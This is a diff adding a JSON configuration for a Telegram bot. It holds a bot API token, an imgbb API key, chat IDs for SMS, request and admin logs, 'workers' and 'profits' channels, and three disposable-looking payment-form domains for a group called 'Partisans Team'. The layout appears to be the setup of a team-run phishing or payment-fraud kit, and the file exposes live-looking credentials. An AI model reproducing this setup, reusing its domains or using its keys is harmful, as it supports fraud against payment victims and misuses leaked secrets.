@@ -1,0 +1,27 @@
+{
+    "bot": {
+        "api_key": "5639445398:AAGd4nQuWNXTXEuzf0qcfLqzyqmp3MOFlKw",
+        "admin_id": 1921625115,
+        "sms_logs": -1001817461424,
+        "admin_logs": -1001817461424,
+        "request_logs": -1001817461424,
+        "workers_chat": -1001546483190,
+        "profits_channel": -1001852167453,
+        "cassa_chat": -1001890725888,
+        "archive_chat": -1001890725888
+    },
+
+    "backend": {
+        "domain": "form-an6037.icu",
+        "domain2": "form-an5325.xyz",
+        "domain3": "save-payments302021.xyz",
+        "imgbb_api": "ac7dcc9ff5de2f32fabfb58a40410683"
+    },
+
+    "teamInfo": {
+        "name": "Partisans Team",
+        "admin_username": "shorelinemane",
+        "chat_link": "https://t.me/+Tm9VHP4iWp9jZDBi",
+        "profits_channel": "https://t.me/+WunVHKxlwwE5ZTYy"
+    }
+}
